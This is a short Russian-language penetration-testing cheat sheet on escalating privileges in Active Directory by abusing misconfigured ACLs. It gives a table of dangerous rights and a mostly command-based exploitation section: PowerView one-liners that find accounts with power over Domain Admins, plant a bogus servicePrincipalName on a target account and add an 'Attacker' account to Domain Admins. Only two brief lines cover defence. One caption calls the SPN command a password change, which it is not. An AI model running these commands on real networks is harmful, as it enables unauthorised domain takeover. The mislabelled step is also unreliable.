#AD #attacks #windows 

> Использование некорректно настроенных списков контроля доступа (ACL) на объектах AD (Пользователях, группах) для повышения привилегий 

Опасные аттрибуты:

| **Право (ACE)**       | **Что позволяет сделать**                          | **Импакт**                                                |
| --------------------- | -------------------------------------------------- | --------------------------------------------------------- |
| **GenericAll**        | Полный контроль над объектом.                      | Можно сбросить пароль, изменить права, удалить объект.    |
| **GenericWrite**      | Запись в любые незащищенные атрибуты.              | Можно изменить скрипт входа или путь к профилю.           |
| **WriteProperty**     | Запись в конкретные атрибуты (например, `member`). | Если это группа, можно добавить себя в неё.               |
| **WriteDacl**         | Право изменять права доступа к объекту.            | Хакер дает самому себе `GenericAll` и захватывает объект. |
| **AllExtendedRights** | Сброс пароля (`ForceChangePassword`) и др.         | Прямой захват учетки без знания старого пароля.           |

# Эксплуатация

PowerView для поиска опасных прав на группе "Domain Admins"
```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl" }
```

Перечисление всех пользователей с опасными правами
```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | `
? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|GenericWrite|WriteProperty|AllExtendedRights" } | `
ForEach-Object {
    $Name = Convert-SidToName $_.SecurityIdentifier
    $Rights = $_.ActiveDirectoryRights
    
    # Если это группа, вытягиваем участников. Если юзер — просто выводим его.
    Get-DomainGroupMember -Identity $Name -Recurse -ErrorAction SilentlyContinue | Select-Object `
        @{Name="UserWhoHasPower"; Expression={$_.MemberName}}, `
        @{Name="InheritedViaGroup"; Expression={$Name}}, `
        @{Name="Rights"; Expression={$Rights}}
}
```

Изменение пароля УЗ для, у которой есть право `GenericAll`
```powershell
Set-DomainObject -Credential $Cred2 -Identity <samaccountname> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

При наличии права GenericAll

PowerView для добавления себя в группу
```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members "Attacker"
```

# Защита
1) Следить за объектов `AdminSDHolder` для защиты привилегированных групп
2) Проводить аудит ACL при помощи **BloodHound** и **PingCastle**